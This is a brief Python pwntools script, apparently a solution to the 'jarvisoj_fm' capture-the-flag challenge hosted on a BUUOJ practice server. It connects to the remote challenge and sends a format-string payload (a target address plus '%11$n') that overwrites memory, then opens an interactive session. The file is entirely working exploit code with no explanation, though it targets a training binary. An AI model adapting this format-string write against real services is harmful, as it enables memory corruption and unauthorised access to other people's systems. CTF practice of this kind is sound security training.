from pwn import *


def jarvisoj_fm(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_fm'):
    print('jarvisoj_fm start')
    target = process([file_name])
    target = remote('node4.buuoj.cn',28432)

    payload = p32(0x0804A02C) + b'%11$n'

    # gdb.attach(target)

    target.sendline(payload)

    target.interactive()
    print('jarvisoj_fm end')


if __name__ == '__main__':
    jarvisoj_fm()
